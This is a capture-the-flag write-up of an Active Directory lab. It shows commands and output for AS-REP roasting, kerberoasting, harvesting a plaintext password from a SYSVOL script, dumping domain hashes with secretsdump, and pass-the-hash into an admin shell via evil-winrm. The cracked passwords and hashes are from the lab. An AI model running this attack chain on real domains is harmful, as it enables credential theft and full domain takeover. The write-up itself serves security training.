## 

## Nmap

```bash
# Nmap 7.92 scan initiated Sat Oct 29 01:59:54 2022 as: nmap -sC -sV -oA nmap/scan-result -Pn 10.10.191.243
Nmap scan report for 10.10.191.243
Host is up (0.30s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-10-29 06:00:27Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: WIN-2BO8M1OE1M1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-10-29T06:00:52
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Oct 29 02:01:30 2022 -- 1 IP address (1 host up) scanned in 95.87 seconds

```

## Lookupsid

```bash
┌──(arun㉿kali)-[~/AD/AD-THM-Rooms/vulnNet-Roasted]
└─$ impacket-lookupsid guest@10.10.191.243
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

Password:
[*] Brute forcing SIDs at 10.10.191.243
[*] StringBinding ncacn_np:10.10.191.243[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-1589833671-435344116-4136949213
498: VULNNET-RST\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: VULNNET-RST\Administrator (SidTypeUser)
501: VULNNET-RST\Guest (SidTypeUser)
502: VULNNET-RST\krbtgt (SidTypeUser)
512: VULNNET-RST\Domain Admins (SidTypeGroup)
513: VULNNET-RST\Domain Users (SidTypeGroup)
514: VULNNET-RST\Domain Guests (SidTypeGroup)
515: VULNNET-RST\Domain Computers (SidTypeGroup)
516: VULNNET-RST\Domain Controllers (SidTypeGroup)
517: VULNNET-RST\Cert Publishers (SidTypeAlias)
518: VULNNET-RST\Schema Admins (SidTypeGroup)
519: VULNNET-RST\Enterprise Admins (SidTypeGroup)
520: VULNNET-RST\Group Policy Creator Owners (SidTypeGroup)
521: VULNNET-RST\Read-only Domain Controllers (SidTypeGroup)
522: VULNNET-RST\Cloneable Domain Controllers (SidTypeGroup)
525: VULNNET-RST\Protected Users (SidTypeGroup)
526: VULNNET-RST\Key Admins (SidTypeGroup)
527: VULNNET-RST\Enterprise Key Admins (SidTypeGroup)
553: VULNNET-RST\RAS and IAS Servers (SidTypeAlias)
571: VULNNET-RST\Allowed RODC Password Replication Group (SidTypeAlias)
572: VULNNET-RST\Denied RODC Password Replication Group (SidTypeAlias)
1000: VULNNET-RST\WIN-2BO8M1OE1M1$ (SidTypeUser)
1101: VULNNET-RST\DnsAdmins (SidTypeAlias)
1102: VULNNET-RST\DnsUpdateProxy (SidTypeGroup)
1104: VULNNET-RST\enterprise-core-vn (SidTypeUser)
1105: VULNNET-RST\a-whitehat (SidTypeUser)
1109: VULNNET-RST\t-skid (SidTypeUser)
1110: VULNNET-RST\j-goldenhand (SidTypeUser)
1111: VULNNET-RST\j-leet (SidTypeUser)

```


We got some users in lookupsid. Lets try AS-REP Roasting.

## AS-REP Roasting

AS-REP roasting is an offensive technique against Kerberos that allows password hashes to be retrieved for users that do not require pre-authentication. If the user has “Do not use Kerberos pre-authentication” enabled, then an attacker can recover a Kerberos AS-REP encrypted with the users RC4-HMAC’d password and he can attempt to crack this ticket offline. - hackingarticles

Tool: GetNPUsers.py 

The script will attempt to list and get TGTs for those users that have the property ‘Do not require Kerberos pre-authentication’ set (UF_DONT_REQUIRE_PREAUTH).

```bash
┌──(arun㉿kali)-[~/AD/AD-THM-Rooms/vulnNet-Roasted]
└─$ /usr/share/doc/python3-impacket/examples/GetNPUsers.py vulnnet-rst.local/t-skid -no-pass
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Getting TGT for t-skid
$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:b294db08dc25a658a32aa9dbe92e2307$36ebb00e2eb478db3a670412475b608beaf3e80a6ca0ee0e8a6dde7dc0e0d6bebb6eec2a90c56350aa217ddba2ff02c67e613bce8f7e82987eeb6a2cfa0b3d5d55146e38cc23e03e0bb9238c8001b2b78e25c2284c2293981703819fadb48bf49d3fe01c0c564355f1270624b37359b82c071540d67d83bf1aeb9cb5ed09905da3536a4a8dc31c8ebcc254295ed78e13ff11139726c2047c1c9463f723702dd0fe29e402fc06b6cb42bc397db413780c2e60bd3208a73bac6f88163df4ad33b877e2991219604bf98a71984fe9deb18a665e8ab02ee518bd5a9c81c2a917e9cdc6cb48d1f75216668b2dfabe3b5d0dab445654a982d8

```

Crack the hash : t-skid:tj072889*

We got this credentials with this we can perform kerberoast attack.

## Kerberoasting

Kerberoasting is a post-exploitation attack technique that attempts to crack the password of a service account within the Active Directory (AD). In such an attack, an adversary masquerading as an account user with a service principal name (SPN) requests a ticket, which contains an encrypted password, or Kerberos.

Note the vulnerable domain member - a user account with servicePrincipalName attribute set, which is very important piece for kerberoasting - only user accounts with that property set are most likely susceptible to kerberoasting - Ired-team

Tool: GetUserSPNs.py

```bash
┌──(arun㉿kali)-[~]
└─$ impacket-GetUserSPNs vulnnet-rst.local/t-skid:"tj072889*" -request                          
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

ServicePrincipalName    Name                MemberOf                                                       PasswordLastSet             LastLogon                   Delegation 
----------------------  ------------------  -------------------------------------------------------------  --------------------------  --------------------------  ----------
CIFS/vulnnet-rst.local  enterprise-core-vn  CN=Remote Management Users,CN=Builtin,DC=vulnnet-rst,DC=local  2021-03-11 14:45:09.913979  2021-03-13 18:41:17.987528             



$krb5tgs$23$*enterprise-core-vn$VULNNET-RST.LOCAL$vulnnet-rst.local/enterprise-core-vn*$cb00d434e2a52d05e937ad3a4099e5c9$0922d77c94aba641e14624b76031d33e5badd4f1e7d065d061f6b5df1648d71f98f6de14c46fcff2a9de063afeb2dc56010b34696e979ec465a0f6488d70a6266d6137ad65dd34adf9e041005735f3d3ae6fbc4364dbd4860b5f4f822020668c11378aad283a0bc0a733073d7bfc73629d8611e55ea569d0e4fca79434fd26645fbaed59001ef64d1562cabd26e244ede8f43b4b10263b96c4419d1675cad4ed5be3f46138cf4d625820f18ef76bdb87f77d0f940e7dbbc793c267f2ffc5393c86ee5d2c40f7f2a1ac0d30fb566ea7546fe17e627274925c5ceafba3e5ad1030b315319e63d3ace4c850880d86dbcdec8ea89fef6c6e6a5411d33e39567c1c4a6fd2a41d92f7aa6f85cae4cd782c4c9d3b62adce4c3afae11c607d3006190acb927ac5495ca481f0bc4914563da30098a5939352bad4ce298a322b6e4b88d876324695508172e36494286ebac18b5796d3dbde3626df5b057ca6ab62202aef3a630a2296f14a8bf6344b982ac88ad4dfd0062cb2b5abf18adb7f9bd880a5292a37a1b54d5e5f03bbfcfd92cd5c8d14a9b2ba5544fc36348a4f3b971d09bc2c9dfa08115ba8d2a79389bcb13d8e22b792e26f18f451fe02980e8306481f031f57f681f163408e15e44148ec1869e3fe136365b9ae7c9368557d1fd73e6d5a307d49d411fe57dc772557a69af6219ee809ded11d01f39271526b2f5cb3739d15f7561989de4b6984af573182bcde112424db9a67e1cb189d5d409e0d594327ff6486fc2961a98e2b8e42e519e19166e3b95f522ab747f20c9c6b959aa7734a84738140dc21725ded915e38bc354959dd4371c8bdb8b84abeda39dc630a530949fc98eeb8f88f0dbfdb104ce59f07a548cc6dbcbb4439a35451f76d1ca8e3165a727796c731fb15ba0974663706509514d894c134e897deb26e49190fa4b68186205615bccccddcd4f6880f633fcc551a124a0705f5a745d9da4ea7721f56ffc53224de2cbfc0dc33c86835cb0232c865459e580309e57c49871d57a7df6ad5d239bc2fc316fb5a5bbba83b54bcaad91c2867de7579e051790f06bff065b7c6523b8c7b45f39289b34972a547a5ade8f048ce09e90e97ca6d224578537f24049329d583bcfc3ee7b6fa0bd471bd798fe58d664b0c506e5007ed3a80234b3b31fa03f84fcd39e57bf4c47fb4c462524a47355c36541a3682fa90f40c49d2a520d7c70d7fa1d01b04bb2e58a0913ced8b6bbb5aeaa395e2f489c874397ebc8ced353d17c25c0059345c4c81f797dce5f9d637e851871d9a5daeaf811538d78bde51e8a92e7e2c5aab43d2ca04fc6f2092d8ca4b3a4b40e61007efc49e6afc2d8924a1f52c06e4974c8b1a4c1d096a6db3fb57e3ef1dff2d75ba12762f13a352
```

crack the hash - "enterprise-core-vn:ry=ibfkfv,s6h,"

The creds are valid to smb SYSVOL share.

```bash
┌──(arun㉿kali)-[~]
└─$ smbclient //10.10.182.249/SYSVOL -U enterprise-core-vn
Password for [WORKGROUP\enterprise-core-vn]:
Try "help" to get a list of possible commands.
smb: \> LS
  .                                   D        0  Thu Mar 11 14:19:49 2021
  ..                                  D        0  Thu Mar 11 14:19:49 2021
  vulnnet-rst.local                  Dr        0  Thu Mar 11 14:19:49 2021

                8540159 blocks of size 4096. 4295915 blocks available
smb: \> cd vulnnet-rst.local
smb: \vulnnet-rst.local\> ls
  .                                   D        0  Thu Mar 11 14:23:40 2021
  ..                                  D        0  Thu Mar 11 14:23:40 2021
  DfsrPrivate                      DHSr        0  Thu Mar 11 14:23:40 2021
  Policies                            D        0  Thu Mar 11 14:20:26 2021
  scripts                             D        0  Tue Mar 16 19:15:49 2021
cd 
                8540159 blocks of size 4096. 4295915 blocks available
smb: \vulnnet-rst.local\> cd scripts
smb: \vulnnet-rst.local\scripts\> ls
  .                                   D        0  Tue Mar 16 19:15:49 2021
  ..                                  D        0  Tue Mar 16 19:15:49 2021
  ResetPassword.vbs                   A     2821  Tue Mar 16 19:18:14 2021

                8540159 blocks of size 4096. 4295927 blocks available
smb: \vulnnet-rst.local\scripts\> get ResetPassword.vbs
getting file \vulnnet-rst.local\scripts\ResetPassword.vbs of size 2821 as ResetPassword.vbs (0.8 KiloBytes/sec) (average 0.8 KiloBytes/sec)
smb: \vulnnet-rst.local\scripts\> 
```

The ResetPassword.vbs has a-whitehat user creds.

	strUserNTName = "a-whitehat"
	strPassword = "bNdKVkjv3RR9ht"

The user has full access! lets dumpsecrets

```bash
┌──(arun㉿kali)-[~]
└─$ smbmap -H vulnnet-rst.local -u  a-whitehat -p "bNdKVkjv3RR9ht"
[+] IP: vulnnet-rst.local:445   Name: unknown                                           
[-] Work[!] Unable to remove test directory at \\vulnnet-rst.local\SYSVOL\WELJDQTRVB, please remove manually
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  READ, WRITE     Remote Admin
        C$                                                      READ, WRITE     Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ, WRITE     Logon server share 
        SYSVOL                                                  READ, WRITE     Logon server share 
        VulnNet-Business-Anonymous                              READ ONLY       VulnNet Business Sharing
        VulnNet-Enterprise-Anonymous                            READ ONLY       VulnNet Enterprise Sharing

```

Tool : secretsdump.py

```bash
┌──(arun㉿kali)-[~]
└─$ impacket-secretsdump vulnnet-rst.local/a-whitehat:bNdKVkjv3RR9ht@10.10.182.249
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xf10a2788aef5f622149a41b2c745f49a
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
VULNNET-RST\WIN-2BO8M1OE1M1$:aes256-cts-hmac-sha1-96:eb358886419579a67259fe5ca5e987e1bfd00dcff8ed08a5b3dc4cfcb170f68d
VULNNET-RST\WIN-2BO8M1OE1M1$:aes128-cts-hmac-sha1-96:f688640d924585a0f7307820ea0e1acc
VULNNET-RST\WIN-2BO8M1OE1M1$:des-cbc-md5:2f8092c1613e1a2a
VULNNET-RST\WIN-2BO8M1OE1M1$:plain_password_hex:1e7e5448b97f1e455ea1e5c026cf17a314390bb6d8c697d72472ecfddced6ceeb9830619568c2e6c441cac6d8c82c451769434b427637ca755798cfe18e477b273b82ad077fa9bbdc04f1dfdd28f5e87d8de2109373020e4b51e14598593701533ad1135f0fc0418c55f32116d6f89309fc8a94afb4f70e990cba84186050038ac149cd19ecbca2a583a88783a9d6f4d4bae5fbe4f54a1e5b266f8a4d8c91ae998b84ffd6c1aa3705cb8d78a64954242438914eb3fd1cc29b9324ea696672c5d70dafac28ec5f0bd4f891c1db1ca90d0f4c68f3a3f9058336975b61e2ebd5a467555c96b8dcd91e9ae12ff9b5aa1e1e4
VULNNET-RST\WIN-2BO8M1OE1M1$:aad3b435b51404eeaad3b435b51404ee:329605126c4d4fe445e77ad78e3eaabf:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x20809b3917494a0d3d5de6d6680c00dd718b1419
dpapi_userkey:0xbf8cce326ad7bdbb9bbd717c970b7400696d3855
[*] NL$KM 
 0000   F3 F6 6B 8D 1E 2A F4 8E  85 F6 7A 46 D1 25 A0 D3   ..k..*....zF.%..
 0010   EA F4 90 7D 2D CB A5 8C  88 C5 68 4C 1E D3 67 3B   ...}-.....hL..g;
 0020   DB 31 D9 91 C9 BB 6A 57  EA 18 2C 90 D3 06 F8 31   .1....jW..,....1
 0030   7C 8C 31 96 5E 53 5B 85  60 B4 D5 6B 47 61 85 4A   |.1.^S[.`..kGa.J
NL$KM:f3f66b8d1e2af48e85f67a46d125a0d3eaf4907d2dcba58c88c5684c1ed3673bdb31d991c9bb6a57ea182c90d306f8317c8c31965e535b8560b4d56b4761854a
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7633f01273fc92450b429d6067d1ca32:::
vulnnet-rst.local\enterprise-core-vn:1104:aad3b435b51404eeaad3b435b51404ee:8752ed9e26e6823754dce673de76ddaf:::
vulnnet-rst.local\a-whitehat:1105:aad3b435b51404eeaad3b435b51404ee:1bd408897141aa076d62e9bfc1a5956b:::
vulnnet-rst.local\t-skid:1109:aad3b435b51404eeaad3b435b51404ee:49840e8a32937578f8c55fdca55ac60b:::
vulnnet-rst.local\j-goldenhand:1110:aad3b435b51404eeaad3b435b51404ee:1b1565ec2b57b756b912b5dc36bc272a:::
vulnnet-rst.local\j-leet:1111:aad3b435b51404eeaad3b435b51404ee:605e5542d42ea181adeca1471027e022:::
WIN-2BO8M1OE1M1$:1000:aad3b435b51404eeaad3b435b51404ee:329605126c4d4fe445e77ad78e3eaabf:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:7f9adcf2cb65ebb5babde6ec63e0c8165a982195415d81376d1f4ae45072ab83
Administrator:aes128-cts-hmac-sha1-96:d9d0cc6b879ca5b7cfa7633ffc81b849
Administrator:des-cbc-md5:52d325cb2acd8fc1
krbtgt:aes256-cts-hmac-sha1-96:a27160e8a53b1b151fa34f45524a07eb9899ebdf0051b20d677f0c3b518885bd
krbtgt:aes128-cts-hmac-sha1-96:75c22aac8f2b729a3a5acacec729e353
krbtgt:des-cbc-md5:1357f2e9d3bc0bd3
vulnnet-rst.local\enterprise-core-vn:aes256-cts-hmac-sha1-96:9da9e2e1e8b5093fb17b9a4492653ceab4d57a451bd41de36b7f6e06e91e98f3
vulnnet-rst.local\enterprise-core-vn:aes128-cts-hmac-sha1-96:47ca3e5209bc0a75b5622d20c4c81d46
vulnnet-rst.local\enterprise-core-vn:des-cbc-md5:200e0102ce868016
vulnnet-rst.local\a-whitehat:aes256-cts-hmac-sha1-96:f0858a267acc0a7170e8ee9a57168a0e1439dc0faf6bc0858a57687a504e4e4c
vulnnet-rst.local\a-whitehat:aes128-cts-hmac-sha1-96:3fafd145cdf36acaf1c0e3ca1d1c5c8d
vulnnet-rst.local\a-whitehat:des-cbc-md5:028032c2a8043ddf
vulnnet-rst.local\t-skid:aes256-cts-hmac-sha1-96:a7d2006d21285baee8e46454649f3bd4a1790c7f4be7dd0ce72360dc6c962032
vulnnet-rst.local\t-skid:aes128-cts-hmac-sha1-96:8bdfe91cca8b16d1b3b3fb6c02565d16
vulnnet-rst.local\t-skid:des-cbc-md5:25c2739dcb646bfd
vulnnet-rst.local\j-goldenhand:aes256-cts-hmac-sha1-96:fc08aeb44404f23ff98ebc3aba97242155060928425ec583a7f128a218e4c5ad
vulnnet-rst.local\j-goldenhand:aes128-cts-hmac-sha1-96:7d218a77c73d2ea643779ac9b125230a
vulnnet-rst.local\j-goldenhand:des-cbc-md5:c4e65d49feb63180
vulnnet-rst.local\j-leet:aes256-cts-hmac-sha1-96:1327c55f2fa5e4855d990962d24986b63921bd8a10c02e862653a0ac44319c62
vulnnet-rst.local\j-leet:aes128-cts-hmac-sha1-96:f5d92fe6dc0f8e823f229fab824c1aa9
vulnnet-rst.local\j-leet:des-cbc-md5:0815580254a49854
WIN-2BO8M1OE1M1$:aes256-cts-hmac-sha1-96:eb358886419579a67259fe5ca5e987e1bfd00dcff8ed08a5b3dc4cfcb170f68d
WIN-2BO8M1OE1M1$:aes128-cts-hmac-sha1-96:f688640d924585a0f7307820ea0e1acc
WIN-2BO8M1OE1M1$:des-cbc-md5:3bdf456be5f72cd6
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
[-] SCMR SessionError: code: 0x41b - ERROR_DEPENDENT_SERVICES_RUNNING - A stop control has been sent to a service that other running services are dependent on.
[*] Cleaning up...
```

## Evil-winram

```bash
┌──(arun㉿kali)-[~]
└─$ evil-winrm -i 10.10.182.249 -u administrator -H c2597747aa5e43022a3a3049a3c3b09d  

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls

    Directory: C:\Users\Administrator\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        3/13/2021   3:34 PM             39 system.txt

*Evil-WinRM* PS C:\Users\Administrator\Desktop> whoami
vulnnet-rst\administrator
*Evil-WinRM* PS C:\Users\Administrator\Desktop> hostname
WIN-2BO8M1OE1M1

```
